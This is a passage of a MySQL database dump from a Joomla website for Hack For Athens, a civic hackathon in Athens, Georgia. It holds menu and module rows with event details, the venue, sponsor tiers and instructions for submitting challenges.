00:00:00',0,1,'components/com_jce/media/img/menu/logo.png',0,'',169,178,0,'',1),(294,'main','WF_MENU_CPANEL','wf-menu-cpanel','','jce/wf-menu-cpanel','index.php?option=com_jce','component',0,293,2,10226,0,'0000-00-00 00:00:00',0,1,'components/com_jce/media/img/menu/jce-cpanel.png',0,'',170,171,0,'',1),(295,'main','WF_MENU_CONFIG','wf-menu-config','','jce/wf-menu-config','index.php?option=com_jce&view=config','component',0,293,2,10226,0,'0000-00-00 00:00:00',0,1,'components/com_jce/media/img/menu/jce-config.png',0,'',172,173,0,'',1),(296,'main','WF_MENU_PROFILES','wf-menu-profiles','','jce/wf-menu-profiles','index.php?option=com_jce&view=profiles','component',0,293,2,10226,0,'0000-00-00 00:00:00',0,1,'components/com_jce/media/img/menu/jce-profiles.png',0,'',174,175,0,'',1),(297,'main','WF_MENU_INSTALL','wf-menu-install','','jce/wf-menu-install','index.php?option=com_jce&view=installer','component',0,293,2,10226,0,'0000-00-00 00:00:00',0,1,'components/com_jce/media/img/menu/jce-install.png',0,'',176,177,0,'',1),(299,'main','COM_B2JCONTACT_MENU','com-b2jcontact-menu','','com-b2jcontact-menu','index.php?option=com_b2jcontact','component',0,1,1,10229,0,'0000-00-00 00:00:00',0,1,'class:component',0,'',179,180,0,'',1);
/*!40000 ALTER TABLE `hfa_menu` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `hfa_menu_types`
--

DROP TABLE IF EXISTS `hfa_menu_types`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `hfa_menu_types` (
  `id` int(10) unsigned NOT NULL AUTO_INCREMENT,
  `menutype` varchar(24) NOT NULL,
  `title` varchar(48) NOT NULL,
  `description` varchar(255) NOT NULL DEFAULT '',
  PRIMARY KEY (`id`),
  UNIQUE KEY `idx_menutype` (`menutype`)
) ENGINE=InnoDB AUTO_INCREMENT=5 DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `hfa_menu_types`
--

LOCK TABLES `hfa_menu_types` WRITE;
/*!40000 ALTER TABLE `hfa_menu_types` DISABLE KEYS */;
INSERT INTO `hfa_menu_types` VALUES (1,'mainmenu','Main Menu','The main menu for the site'),(3,'kunenamenu','Kunena Menu','This is the default Kunena menu. It is used as the top navigation for Kunena. It can be publish in any module position. Simply unpublish items that are not required.'),(4,'bottommenu','Bottom Meu','');
/*!40000 ALTER TABLE `hfa_menu_types` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `hfa_messages`
--

DROP TABLE IF EXISTS `hfa_messages`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `hfa_messages` (
  `message_id` int(10) unsigned NOT NULL AUTO_INCREMENT,
  `user_id_from` int(10) unsigned NOT NULL DEFAULT '0',
  `user_id_to` int(10) unsigned NOT NULL DEFAULT '0',
  `folder_id` tinyint(3) unsigned NOT NULL DEFAULT '0',
  `date_time` datetime NOT NULL DEFAULT '0000-00-00 00:00:00',
  `state` tinyint(1) NOT NULL DEFAULT '0',
  `priority` tinyint(1) unsigned NOT NULL DEFAULT '0',
  `subject` varchar(255) NOT NULL DEFAULT '',
  `message` text NOT NULL,
  PRIMARY KEY (`message_id`),
  KEY `useridto_state` (`user_id_to`,`state`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `hfa_messages`
--

LOCK TABLES `hfa_messages` WRITE;
/*!40000 ALTER TABLE `hfa_messages` DISABLE KEYS */;
/*!40000 ALTER TABLE `hfa_messages` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `hfa_messages_cfg`
--

DROP TABLE IF EXISTS `hfa_messages_cfg`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `hfa_messages_cfg` (
  `user_id` int(10) unsigned NOT NULL DEFAULT '0',
  `cfg_name` varchar(100) NOT NULL DEFAULT '',
  `cfg_value` varchar(255) NOT NULL DEFAULT '',
  UNIQUE KEY `idx_user_var_name` (`user_id`,`cfg_name`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `hfa_messages_cfg`
--

LOCK TABLES `hfa_messages_cfg` WRITE;
/*!40000 ALTER TABLE `hfa_messages_cfg` DISABLE KEYS */;
/*!40000 ALTER TABLE `hfa_messages_cfg` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `hfa_modules`
--

DROP TABLE IF EXISTS `hfa_modules`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `hfa_modules` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `asset_id` int(10) unsigned NOT NULL DEFAULT '0' COMMENT 'FK to the #__assets table.',
  `title` varchar(100) NOT NULL DEFAULT '',
  `note` varchar(255) NOT NULL DEFAULT '',
  `content` text NOT NULL,
  `ordering` int(11) NOT NULL DEFAULT '0',
  `position` varchar(50) NOT NULL DEFAULT '',
  `checked_out` int(10) unsigned NOT NULL DEFAULT '0',
  `checked_out_time` datetime NOT NULL DEFAULT '0000-00-00 00:00:00',
  `publish_up` datetime NOT NULL DEFAULT '0000-00-00 00:00:00',
  `publish_down` datetime NOT NULL DEFAULT '0000-00-00 00:00:00',
  `published` tinyint(1) NOT NULL DEFAULT '0',
  `module` varchar(50) DEFAULT NULL,
  `access` int(10) unsigned NOT NULL DEFAULT '0',
  `showtitle` tinyint(3) unsigned NOT NULL DEFAULT '1',
  `params` text NOT NULL,
  `client_id` tinyint(4) NOT NULL DEFAULT '0',
  `language` char(7) NOT NULL,
  PRIMARY KEY (`id`),
  KEY `published` (`published`,`access`),
  KEY `newsfeeds` (`module`,`published`),
  KEY `idx_language` (`language`)
) ENGINE=InnoDB AUTO_INCREMENT=245 DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `hfa_modules`
--

LOCK TABLES `hfa_modules` WRITE;
/*!40000 ALTER TABLE `hfa_modules` DISABLE KEYS */;
INSERT INTO `hfa_modules` VALUES (2,0,'Login','','',1,'login',0,'0000-00-00 00:00:00','0000-00-00 00:00:00','0000-00-00 00:00:00',1,'mod_login',1,1,'',1,'*'),(3,0,'Popular Articles','','',3,'cpanel',0,'0000-00-00 00:00:00','0000-00-00 00:00:00','0000-00-00 00:00:00',1,'mod_popular',3,1,'{\"count\":\"5\",\"catid\":\"\",\"user_id\":\"0\",\"layout\":\"_:default\",\"moduleclass_sfx\":\"\",\"cache\":\"0\",\"automatic_title\":\"1\"}',1,'*'),(4,0,'Recently Added Articles','','',4,'cpanel',0,'0000-00-00 00:00:00','0000-00-00 00:00:00','0000-00-00 00:00:00',1,'mod_latest',3,1,'{\"count\":\"5\",\"ordering\":\"c_dsc\",\"catid\":\"\",\"user_id\":\"0\",\"layout\":\"_:default\",\"moduleclass_sfx\":\"\",\"cache\":\"0\",\"automatic_title\":\"1\"}',1,'*'),(8,0,'Toolbar','','',1,'toolbar',0,'0000-00-00 00:00:00','0000-00-00 00:00:00','0000-00-00 00:00:00',1,'mod_toolbar',3,1,'',1,'*'),(9,0,'Quick Icons','','',1,'icon',0,'0000-00-00 00:00:00','0000-00-00 00:00:00','0000-00-00 00:00:00',1,'mod_quickicon',3,1,'',1,'*'),(10,0,'Logged-in Users','','',2,'cpanel',0,'0000-00-00 00:00:00','0000-00-00 00:00:00','0000-00-00 00:00:00',1,'mod_logged',3,1,'{\"count\":\"5\",\"name\":\"1\",\"layout\":\"_:default\",\"moduleclass_sfx\":\"\",\"cache\":\"0\",\"automatic_title\":\"1\"}',1,'*'),(12,0,'Admin Menu','','',1,'menu',0,'0000-00-00 00:00:00','0000-00-00 00:00:00','0000-00-00 00:00:00',1,'mod_menu',3,1,'{\"layout\":\"\",\"moduleclass_sfx\":\"\",\"shownew\":\"1\",\"showhelp\":\"1\",\"cache\":\"0\"}',1,'*'),(13,0,'Admin Submenu','','',1,'submenu',0,'0000-00-00 00:00:00','0000-00-00 00:00:00','0000-00-00 00:00:00',1,'mod_submenu',3,1,'',1,'*'),(14,0,'User Status','','',2,'status',0,'0000-00-00 00:00:00','0000-00-00 00:00:00','0000-00-00 00:00:00',1,'mod_status',3,1,'',1,'*'),(15,0,'Title','','',1,'title',0,'0000-00-00 00:00:00','0000-00-00 00:00:00','0000-00-00 00:00:00',1,'mod_title',3,1,'',1,'*'),(79,0,'Multilanguage status','','',1,'status',0,'0000-00-00 00:00:00','0000-00-00 00:00:00','0000-00-00 00:00:00',0,'mod_multilangstatus',3,1,'{\"layout\":\"_:default\",\"moduleclass_sfx\":\"\",\"cache\":\"0\"}',1,'*'),(86,0,'Joomla Version','','',1,'footer',0,'0000-00-00 00:00:00','0000-00-00 00:00:00','0000-00-00 00:00:00',1,'mod_version',3,1,'{\"format\":\"short\",\"product\":\"1\",\"layout\":\"_:default\",\"moduleclass_sfx\":\"\",\"cache\":\"0\"}',1,'*'),(166,124,'Front Page Showcase','','',1,'showcase-a',0,'0000-00-00 00:00:00','0000-00-00 00:00:00','0000-00-00 00:00:00',1,'mod_roksprocket',1,0,'{\"run_content_plugins\":\"onmodule\",\"provider\":\"joomla\",\"layout\":\"features\",\"joomla_articles\":{\"1\":{\"root\":{\"article\":\"38\"}}},\"joomla_sort\":\"manual\",\"joomla_sort_manual_append\":\"after\",\"display_limit\":\"\\u221e\",\"features_themes\":\"showcase\",\"features_show_title\":\"1\",\"features_show_article_text\":\"1\",\"features_previews_length\":\"\\u221e\",\"features_strip_html_tags\":\"0\",\"features_show_arrows\":\"hide\",\"features_show_pagination\":\"0\",\"features_animation\":\"crossfade\",\"features_autoplay\":\"0\",\"features_autoplay_delay\":\"5\",\"features_resize_enable\":\"0\",\"features_resize_width\":\"0\",\"features_resize_height\":\"0\",\"features_title_default\":\"title\",\"features_description_default\":\"primary\",\"features_image_default\":\"primary\",\"features_image_default_custom\":\"\",\"features_link_default\":\"primary\",\"features_link_default_custom\":\"\",\"cache\":\"0\",\"moduleclass_sfx\":\"fp-roksprocket-features fp-roksprocket-features-rl\",\"module_cache\":\"1\",\"cache_time\":\"900\"}',0,'*'),(167,0,'Under FP Header','','<div class=\"rt-center fix-padding\"><img style=\"margin-left: 3%; width: 37%;\" src=\"images/Logo_Header_RedandBlue_Athens.png\" alt=\"Logo Header RedandBlue Athens\" class=\"homepage-intro-image\" />\r\n<p class=\"homepage-intro-text\">The National Day of Civic Hacking is <span style=\"color: #356788;\"><strong>a national event</strong></span> that will take place <span style=\"color: #79110b;\"><strong>June 1st-2nd, 2013</strong></span> and will bring together citizens, software developers, and entrepreneurs across the nation to <strong><span style=\"color: #356788;\">collaboratively</span> <span style=\"color: #79110b;\">create</span>, build, and invent</strong> using <strong><span style=\"color: #356788;\">publicly-released</span> <span style=\"color: #79110b;\">data</span></strong>, code, and technology to solve challenges relevant to our neighborhoods, our cities, our states, and our country.</p>\r\n</div>',1,'utility-a',0,'0000-00-00 00:00:00','0000-00-00 00:00:00','0000-00-00 00:00:00',0,'mod_custom',1,0,'{\"prepare_content\":\"1\",\"backgroundimage\":\"\",\"layout\":\"_:default\",\"moduleclass_sfx\":\"title5 icon-star featuretitle nomarginbottom nopaddingbottom\",\"cache\":\"1\",\"cache_time\":\"900\",\"cachemode\":\"static\"}',0,'*'),(169,127,'How Can I Help?','','<div class=\"gantry-width-block demo-width-100\">\r\n\r\n<div class=\"gantry-width-33 gantry-width-block\">\r\n<div class=\"gantry-width-spacer\">\r\n<div class=\"gantry-width-30 gantry-width-block\"><h5 class=\"title largemarginright\"><span class=\"rt-bubble icon-group rt-big-bubble\"></span></h5></div>\r\n<div class=\"gantry-width-70 gantry-width-block\">\r\n<h3 class=\"nomarginbottom\"><a href=\"/register\">1. Register</a></h3>\r\n<p><a href=\"/register\">It only takes a minute</a>, use your Facebook account if you\'d like!</p>\r\n</div>\r\n</div>\r\n</div>\r\n\r\n<div class=\"gantry-width-33 gantry-width-block\">\r\n<div class=\"gantry-width-spacer\">\r\n<div class=\"gantry-width-30 gantry-width-block\"><h5 class=\"title largemarginright\"><span class=\"rt-bubble icon-heart rt-big-bubble\"></span></h5></div>\r\n<div class=\"gantry-width-70 gantry-width-block\">\r\n<h3 class=\"nomarginbottom\"><a href=\"/about/schedule\">2. Attend</a></h3>\r\n<p>Kickoff is at <a href=\"/about/schedule\">May 31st, 10:00am</a> at Oakbrook Corporate Plaza | 330 Research Drive | Athens, GA 30605</p>\r\n</div>\r\n</div>\r\n</div>\r\n\r\n<div class=\"gantry-width-33 gantry-width-block\">\r\n<div class=\"gantry-width-spacer\">\r\n<div class=\"gantry-width-30 gantry-width-block\"><h5 class=\"title largemarginright\"><span class=\"rt-bubble icon-star rt-big-bubble\"></span></h5></div>\r\n<div class=\"gantry-width-70 gantry-width-block\">\r\n<h3 class=\"nomarginbottom\"><a href=\"/get-involved/challenges/view-challenges\">3. Solve</a></h3>\r\n<p>Use the <a href=\"/get-involved/datasets/view-datasets\">large datasets</a> we have publicly-available to solve <a href=\"/get-involved/challenges/view-challenges\">local challenges</a></p>\r\n</div>\r\n</div>\r\n</div>\r\n</div>\r\n\r\n<div class=\"clear\">&nbsp;</div>',1,'maintop-a',0,'0000-00-00 00:00:00','0000-00-00 00:00:00','0000-00-00 00:00:00',1,'mod_custom',1,1,'{\"prepare_content\":\"1\",\"backgroundimage\":\"\",\"layout\":\"_:default\",\"moduleclass_sfx\":\"title5 featuretitle icon-info-sign fp-maintop hidden-phone\",\"cache\":\"1\",\"cache_time\":\"900\",\"cachemode\":\"static\",\"module_tag\":\"div\",\"bootstrap_size\":\"0\",\"header_tag\":\"h3\",\"header_class\":\"\",\"style\":\"0\"}',0,'*'),(173,125,'Hack For Athens Info','','<div class=\"clear medmarginbottom\">&nbsp;</div>\r\n<div class=\"gantry-width-90 gantry-width-block\"><small><span style=\"font-size: 12px;\">Oakbrook Corporate Plaza</span></small></div>\r\n<div class=\"gantry-width-90 gantry-width-block\"><small><span style=\"font-size: 12px;\">330 Research Drive</span></small></div>\r\n<div class=\"gantry-width-90 gantry-width-block\"><small>Athens, GA 30605</small></div>\r\n<div class=\"gantry-width-10 gantry-width-block\">&nbsp;</div>\r\n<div class=\"gantry-width-80 gantry-width-block\"><span>support@hackforathens.org</span></div>\r\n<div class=\"clear largemarginbottom\">&nbsp;</div>\r\n<div class=\"rt-social-buttons largemargintop largepaddingtop\"><span class=\"largepaddingright hidden-tablet hidden-phone\">Follow Us</span> <a class=\"social-button rt-facebook-btn\" href=\"http://www.facebook.com/HackForAthens\"><span class=\"icon-facebook\"></span></a> <a class=\"social-button rt-twitter-btn\" href=\"https://twitter.com/hackforathens\"><span class=\"icon-twitter\"></span></a></div>',1,'footer-a',0,'0000-00-00 00:00:00','0000-00-00 00:00:00','0000-00-00 00:00:00',1,'mod_custom',1,0,'{\"prepare_content\":\"1\",\"backgroundimage\":\"\",\"layout\":\"_:default\",\"moduleclass_sfx\":\"\",\"cache\":\"1\",\"cache_time\":\"900\",\"cachemode\":\"static\",\"module_tag\":\"div\",\"bootstrap_size\":\"0\",\"header_tag\":\"h3\",\"header_class\":\"\",\"style\":\"0\"}',0,'*'),(176,0,'FP RokAjaxSearch','','',1,'header-c',0,'0000-00-00 00:00:00','0000-00-00 00:00:00','0000-00-00 00:00:00',1,'mod_rokajaxsearch',1,0,'{\"search_page\":\"index.php?option=com_search&view=search&tmpl=component\",\"adv_search_page\":\"index.php?option=com_search&view=search\",\"include_css\":\"0\",\"theme\":\"blue\",\"searchphrase\":\"any\",\"ordering\":\"newest\",\"limit\":\"10\",\"perpage\":\"3\",\"websearch\":\"0\",\"blogsearch\":\"0\",\"imagesearch\":\"0\",\"videosearch\":\"0\",\"websearch_api\":\"\",\"show_pagination\":\"1\",\"safesearch\":\"MODERATE\",\"image_size\":\"MEDIUM\",\"show_estimated\":\"1\",\"hide_divs\":\"\",\"include_link\":\"1\",\"show_description\":\"1\",\"include_category\":\"1\",\"show_readmore\":\"1\",\"moduleclass_sfx\":\"fp-search nomarginbottom nopaddingbottom\",\"cache\":\"1\",\"cache_time\":\"900\",\"cachemode\":\"static\"}',0,'*'),(182,0,'Overview','','<div class=\"gantry-width-block demo-width-100\">\r\n  <div class=\"gantry-width-block\">\r\n    <div class=\"gantry-width-spacer\">\r\n      <div class=\"gantry-width-mobile-20\">\r\n        <h5 class=\"title\"><span class=\"rt-bubble icon-briefcase rt-big-bubble\"></span></h5>\r\n      </div>  \r\n      <div class=\"gantry-width-mobile-80\">\r\n        <h3 class=\"nomarginbottom\"><a href=\"index.php?option=com_content&amp;view=article&amp;id=5&amp;Itemid=112\">Dropdowns</a></h3>\r\n        <p>A CSS based dropdown menu with advanced options such as mutli-columns.</p>\r\n      </div>  \r\n    </div>\r\n  </div>  \r\n  <div class=\"clear\"></div>\r\n  <div class=\"gantry-width-block\">\r\n    <div class=\"gantry-width-spacer\">\r\n      <div class=\"gantry-width-mobile-20\">\r\n        <h5 class=\"title\"><span class=\"rt-bubble icon-list-alt rt-big-bubble\"></span></h5>\r\n      </div>  \r\n      <div class=\"gantry-width-mobile-80\">\r\n        <h3 class=\"nomarginbottom\"><a href=\"index.php?option=com_content&amp;view=article&amp;id=6&amp;Itemid=113\">Extensions</a></h3>\r\n        <p>Styled support for RokSprocket, RokAjaxSearch and K2 (3rd party).</p>\r\n      </div>  \r\n    </div>\r\n  </div>  \r\n  <div class=\"clear\"></div>\r\n  <div class=\"gantry-width-block\">\r\n    <div class=\"gantry-width-spacer\">\r\n      <div class=\"gantry-width-mobile-20\">\r\n        <h5 class=\"title\"><span class=\"rt-bubble icon-cloud rt-big-bubble\"></span></h5>\r\n      </div>  \r\n      <div class=\"gantry-width-mobile-80\">\r\n        <h3 class=\"nomarginbottom\"><a href=\"index.php?option=com_content&amp;view=article&amp;id=10&amp;Itemid=117\">Presets</a></h3>\r\n        <p>Eight preset style variations to choose, each with configurable options.</p>\r\n      </div>  \r\n    </div>\r\n  </div>   \r\n</div>\r\n<div class=\"clear\"></div>',2,'maintop-a',0,'0000-00-00 00:00:00','0000-00-00 00:00:00','0000-00-00 00:00:00',1,'mod_custom',1,0,'{\"prepare_content\":\"1\",\"backgroundimage\":\"\",\"layout\":\"_:default\",\"moduleclass_sfx\":\"title5 featuretitle fp-maintop visible-phone\",\"cache\":\"1\",\"cache_time\":\"900\",\"cachemode\":\"static\"}',0,'*'),(201,126,'Hack For Athens Info','','<dl class=\"dl-horizontal small-dt\">\r\n<dt>Who:</dt><dd>Developers, designers, and anyone who lives in Athens</dd>\r\n<dt>What:</dt> <dd>Solving local challenges with technology</dd>\r\n<dt>Where:</dt> <dd>Oakbrook Corporate Plaza | 330 Research Drive | Athens, GA 30605</dd>\r\n<dt>When:</dt> <dd>May 31st - June 1st, 2014</dd>\r\n<dt>Why:</dt> <dd>Answer the White House call to action while strengthening our community</dd>\r\n</dl>',6,'sidebar-a',0,'0000-00-00 00:00:00','0000-00-00 00:00:00','0000-00-00 00:00:00',1,'mod_custom',1,1,'{\"prepare_content\":\"1\",\"backgroundimage\":\"\",\"layout\":\"_:default\",\"moduleclass_sfx\":\"box1 title2 icon-info-sign\",\"cache\":\"1\",\"cache_time\":\"900\",\"cachemode\":\"static\",\"module_tag\":\"div\",\"bootstrap_size\":\"0\",\"header_tag\":\"h3\",\"header_class\":\"\",\"style\":\"0\"}',0,'*'),(202,0,'Bottom Menu','','',1,'copyright-b',0,'0000-00-00 00:00:00','0000-00-00 00:00:00','0000-00-00 00:00:00',1,'mod_menu',1,0,'{\"menutype\":\"bottommenu\",\"startLevel\":\"1\",\"endLevel\":\"0\",\"showAllChildren\":\"0\",\"tag_id\":\"\",\"class_sfx\":\"\",\"window_open\":\"\",\"layout\":\"_:default\",\"moduleclass_sfx\":\"horizmenu\",\"cache\":\"1\",\"cache_time\":\"900\",\"cachemode\":\"itemid\"}',0,'*'),(209,0,'Adding Datasets','','<p>Follow the instructions below to submit your dataset or resource to Hack For Athens:</p>\r\n<ol>\r\n<li>Provide your organization, business, or department\'s name</li>\r\n<li>Provide a contact email address and phone number where we can reach you if there are issues with the submitted dataset</li>\r\n<li>Provide a title that will publicly identify the dataset for the community</li>\r\n<li>Provide a link to the webpage or resource containing the dataset&nbsp;<strong></strong></li>\r\n<li>Select the format of the dataset</li>\r\n<li>Submit, and if we have any questions we\'ll be in touch!</li>\r\n</ol>',7,'sidebar-a',0,'0000-00-00 00:00:00','0000-00-00 00:00:00','0000-00-00 00:00:00',1,'mod_custom',1,1,'{\"prepare_content\":\"1\",\"backgroundimage\":\"\",\"layout\":\"_:default\",\"moduleclass_sfx\":\"box1 title2 icon-info-sign\",\"cache\":\"1\",\"cache_time\":\"900\",\"cachemode\":\"static\"}',0,'*'),(210,0,'Sponsor Levels','','<p>\r\n<table>\r\n<tbody>\r\n<tr>\r\n<td></td>\r\n<td class=\"sponsor-table-header\">Bootstrap</td>\r\n<td class=\"sponsor-table-header\">Angel</td>\r\n<td class=\"sponsor-table-header\">Venture</td>\r\n</tr>\r\n<tr>\r\n<td>Sponsor Amount</td>\r\n<td align=\"center\">$100</td>\r\n<td align=\"center\">$250</td>\r\n<td align=\"center\">$500</td>\r\n</tr>\r\n<tr>\r\n<td>Mention on SM Outlets</td>\r\n<td><span class=\"icon-check\"></span></td>\r\n<td><span class=\"icon-check\"></span></td>\r\n<td><span class=\"icon-check\"></span></td>\r\n</tr>\r\n<tr>\r\n<td>Logo on SM Banners</td>\r\n<td></td>\r\n<td><span class=\"icon-check\"></span></td>\r\n<td><span class=\"icon-check\"></span></td>\r\n</tr>\r\n<tr>\r\n<td>Logo on Website</td>\r\n<td></td>\r\n<td><span class=\"icon-check\"></span></td>\r\n<td><span class=\"icon-check\"></span></td>\r\n</tr>\r\n<tr>\r\n<td>Logo on Event Emails</td>\r\n<td></td>\r\n<td><span class=\"icon-check\"></span></td>\r\n<td><span class=\"icon-check\"></span></td>\r\n</tr>\r\n<tr>\r\n<td>Mention on Radio</td>\r\n<td></td>\r\n<td><span class=\"icon-check\"></span></td>\r\n<td><span class=\"icon-check\"></span></td>\r\n</tr>\r\n<tr>\r\n<td>Mention in all PR</td>\r\n<td></td>\r\n<td><span class=\"icon-check\"></span></td>\r\n<td><span class=\"icon-check\"></span></td>\r\n</tr>\r\n<tr>\r\n<td>Logo on Banner</td>\r\n<td></td>\r\n<td></td>\r\n<td><span class=\"icon-check\"></span></td>\r\n</tr>\r\n<tr>\r\n<td>Opportunity to Speak</td>\r\n<td></td>\r\n<td></td>\r\n<td><span class=\"icon-check\"></span></td>\r\n</tr>\r\n<tr>\r\n<td>Recognized as Premiere Sponsor</td>\r\n<td></td>\r\n<td></td>\r\n<td><span class=\"icon-check\"></span></td>\r\n</tr>\r\n</tbody>\r\n</table>\r\n</p>',9,'sidebar-a',0,'0000-00-00 00:00:00','0000-00-00 00:00:00','0000-00-00 00:00:00',1,'mod_custom',1,1,'{\"prepare_content\":\"1\",\"backgroundimage\":\"\",\"layout\":\"_:default\",\"moduleclass_sfx\":\"box1 title2 icon-tasks sponsor-levels\",\"cache\":\"1\",\"cache_time\":\"900\",\"cachemode\":\"static\"}',0,'*'),(211,0,'Adding Challenges','','<p>Follow the instructions below to submit your dataset or resource to Hack For Athens:</p>\r\n<ol>\r\n<li>Provide your organization, business, or department\'s name</li>\r\n<li>Provide a contact email address and phone number where we can reach you if there are issues with the submitted dataset</li>\r\n<li>Provide a title that will publicly identify the challenge for the community</li>\r\n<li>Provide a full description of the challenge</li>\r\n<li>Submit, and if we have any questions we\'ll be in touch!</li>\r\n</ol>',8,'sidebar-a',0,'0000-00-00 00:00:00','0000-00-00 00:00:00','0000-00-00 00:00:00',1,'mod_custom',1,1,'{\"prepare_content\":\"1\",\"backgroundimage\":\"\",\"layout\":\"_:default\",\"moduleclass_sfx\":\"box1 title2 icon-info-sign\",\"cache\":\"1\",\"cache_time\":\"900\",\"cachemode\":\"static\"}',0,'*'),(216,129,'The Event','','<dl class=\"dl-horizontal small-dt\">\r\n<dt>Who:</dt><dd>Developers, designers, and anyone who lives in Athens</dd>\r\n<dt>What:</dt> <dd>Solving local challenges with technology</dd>\r\n<dt>Where:</dt> <dd>Oakbrook Corporate Plaza | 330 Research Drive, Athens, GA</dd>\r\n<dt>When:</dt> <dd>May 31st-June 1st, 2014</dd>\r\n<dt>Why:</dt> <dd>Answer the White House call to action while strengthening our community</dd>\r\n</dl>\r\n\r\n<a class=\"btn btn-large btn-block btn-primary\" href=\"/register\">Register Today!</a>',1,'sidebar-a',0,'0000-00-00 00:00:00','0000-00-00 00:00:00','0000-00-00 00:00:00',1,'mod_custom',1,1,'{\"prepare_content\":\"1\",\"backgroundimage\":\"\",\"layout\":\"_:default\",\"moduleclass_sfx\":\"box1 title2 icon-info-sign\",\"cache\":\"1\",\"cache_time\":\"900\",\"cachemode\":\"static\",\"module_tag\":\"div\",\"bootstrap_size\":\"0\",\"header_tag\":\"h3\",\"header_class\":\"\",\"style\":\"0\"}',0,'*'),(217,0,'What Are Challenges?','','<p><img src=\"images/H4WM-Challenges-01.png\" width=\"500\" height=\"334\" alt=\"H4WM-Challenges-01\" style=\"margin: 10px; float: right;\" />Challenges bring together government officials, leaders, and volunteer technologists, data wranglers, and designers to develop technical solutions to local or national challenges. Past results have ranged from projects to <a href=\"http://www.bringfood.org/client-desktop/index.php\" target=\"_blank\">match surplus food to those who can distribute it</a> to <a href=\"http://www.rhok.org/blog/rhok-success-stories-ad-hawk\" target=\"_blank\">tools for identifying backers of political ads</a> to <a href=\"http://commons.codeforamerica.org/apps/opentreemap\" target=\"_blank\">maps of city tree ecosystems</a>.</p>\r\n<div style=\"text-align: center;\"><a href=\"https://www.dropbox.com/s/tw4hb5omjmzob8m/NDoCH%20-%20Community%20Services%20Persona%20v1.pdf\" class=\"btn btn-primary\" target=\"_blank\">Download and view this PDF with an example of how to create a solution to a challenge</a></div>\r\n<h3>How it Works</h3>\r\n<p>Local organizations and businesses are providing challenges to Hack For Athens that you and your team can review when selecting which project to work on. Some organizations and businesses may also be available during the event in order to work with the teams tackling their specific challenge throughout the weekend. Teams will submit their idea as a \"pitch\" on Sunday afternoon, June 2, then \"pitch\" their idea during the Pitch Contest that night. All projects will be open sourced and featured on the Hack for Athens website.</p>\r\n<p><b>A good challenge:</b></p>\r\n<ul>\r\n<li>Is related to an ongoing problem which your organization works on.</li>\r\n<li>Has context and is relevant to the community.</li>\r\n<li>Has an understandable impact. How many people would benefit if the problem was solved? Which organization(s) would use the solution?</li>\r\n<li>Has data. What data would help solve this problem? Is it publicly available?</li>\r\n</ul>\r\n<p><a class=\"btn btn-large btn-block btn-primary\" href=\"index.php?option=com_chronoforms&amp;view=form&amp;Itemid=186\">Have a challenge? Submit it here!</a></p>',1,'mainbottom-a',0,'0000-00-00 00:00:00','0000-00-00 00:00:00','0000-00-00 00:00:00',1,'mod_custom',1,1,'{\"prepare_content\":\"1\",\"backgroundimage\":\"\",\"layout\":\"_:default\",\"moduleclass_sfx\":\"box1 title2 icon-info-sign\",\"cache\":\"1\",\"cache_time\":\"900\",\"cachemode\":\"static\"}',0,'*'),(218,128,'Hack For Athens Venue','','<iframe width=\"550\" height=\"165\" frameborder=\"0\" scrolling=\"no\" marginheight=\"0\" marginwidth=\"0\" src=\"https://maps.google.com/maps?f=q&amp;source=s_q&amp;hl=en&amp;geocode=&amp;q=330+research+drive,+athens,+ga&amp;aq=&amp;sll=33.944274,-83.389123&amp;sspn=0.452283,0.942078&amp;ie=UTF8&amp;hq=&amp;hnear=330+Research+Dr,+Athens,+Georgia+30605&amp;t=m&amp;z=14&amp;ll=33.928502,-83.349131&amp;output=embed\"></iframe>\r\n\r\n',1,'footer-b',0,'0000-00-00 00:00:00','0000-00-00 00:00:00','0000-00-00 00:00:00',1,'mod_custom',1,0,'{\"prepare_content\":\"1\",\"backgroundimage\":\"\",\"layout\":\"_:default\",\"moduleclass_sfx\":\"\",\"cache\":\"1\",\"cache_time\":\"900\",\"cachemode\":\"static\",\"module_tag\":\"div\",\"bootstrap_size\":\"0\",\"header_tag\":\"h3\",\"header_class\":\"\",\"style\":\"0\"}',0,'*'),(223,0,'Sponsors','','<p><img src=\"images/sponsors.png\" width=\"371\" height=\"239\" alt=\"sponsors\" style=\"margin: 4px;\" /></p>',4,'sidebar-a',0,'0000-00-00 00:00:00','0000-00-00 00:00:00','0000-00-00 00:00:00',0,'mod_custom',1,0,'{\"prepare_content\":\"1\",\"backgroundimage\":\"\",\"layout\":\"_:default\",\"moduleclass_sfx\":\"box1 title2 sponsor-levels\",\"cache\":\"1\",\"cache_time\":\"900\",\"cachemode\":\"static\"}',0,'*'),(229,0,'MailChimp Signup','','',0,'',0,'0000-00-00 00:00:00','0000-00-00 00:00:00','0000-00-00 00:00:00',0,'mod_mailchimpsignup',1,1,'',0,'*'),(230,0,'MailChimp Stats','','',-1,'cpanel',0,'0000-00-00 00:00:00','0000-00-00 00:00:00','0000-00-00 00:00:00',1,'mod_mailchimpstats',1,1,'',1,'*'),(231,0,'Event Overview','','',1,'content-bottom-a',0,'0000-00-00 00:00:00','0000-00-00 00:00:00','0000-00-00 